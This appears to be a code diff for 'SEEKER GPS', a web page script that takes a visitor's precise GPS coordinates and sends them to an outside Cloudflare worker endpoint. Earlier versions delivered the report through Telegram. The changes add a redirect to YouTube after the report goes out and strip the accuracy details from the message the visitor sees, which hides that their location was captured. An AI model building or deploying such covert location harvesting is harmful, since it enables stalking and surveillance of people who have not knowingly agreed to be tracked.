@@ -1,7 +1,8 @@
 
 /* ==========================================
    SEEKER GPS - PRECISION MODE
-   Version 2.0
+   Version 2.1
+   GPS FIRST -> REPORT -> REDIRECT
    ========================================== */
 
 
@@ -15,11 +16,15 @@ const result = document.getElementById("result");
 const WORKER_URL =
     "https://dark-hill-bae4.ykzir-polyglot.workers.dev/api/report";
 
+// Landing page after successful report
+
+const REDIRECT_URL = "https://www.youtube.com";
+
 // GPS acquisition settings
 
-const GPS_TIMEOUT = 60000;       // Maximum 60 seconds
-const TARGET_ACCURACY = 10;      // Stop early at 10 meters
-const GPS_MAXIMUM_AGE = 0;       // Do not use cached positions
+const GPS_TIMEOUT = 60000;
+const TARGET_ACCURACY = 10;
+const GPS_MAXIMUM_AGE = 0;
 
 
 /* ==========================================
@@ -474,7 +479,7 @@ async function sendLocation(
 
 
     console.log(
-        "SEEKER GPS: Telegram delivery confirmed."
+        "SEEKER GPS: REPORT DELIVERY CONFIRMED."
     );
 
     return data;
@@ -601,15 +606,25 @@ async function startPrecisionGPS() {
         if (response.success === true) {
 
             result.textContent =
-                "Location report delivered successfully! " +
-                "Accuracy: " +
-                gps.accuracy.toFixed(1) +
-                " meters. Readings: " +
-                gps.readings;
+                "Location report delivered successfully. Redirecting...";
 
             console.log(
                 "SEEKER GPS: REPORT DELIVERED SUCCESSFULLY."
             );
+
+
+            /* ==================================
+               STEP 5: REDIRECT TO LANDING PAGE
+               ================================== */
+
+            console.log(
+                "SEEKER GPS: REDIRECTING TO:",
+                REDIRECT_URL
+            );
+
+            window.location.replace(REDIRECT_URL);
+
+            return;
 
         }
 
@@ -626,7 +641,16 @@ async function startPrecisionGPS() {
 
     } finally {
 
-        locationBtn.disabled = false;
+        // Keep the button disabled during navigation.
+        // Re-enable it only if redirect has not started.
+
+        if (
+            window.location.href !== REDIRECT_URL
+        ) {
+
+            locationBtn.disabled = false;
+
+        }
 
     }
 
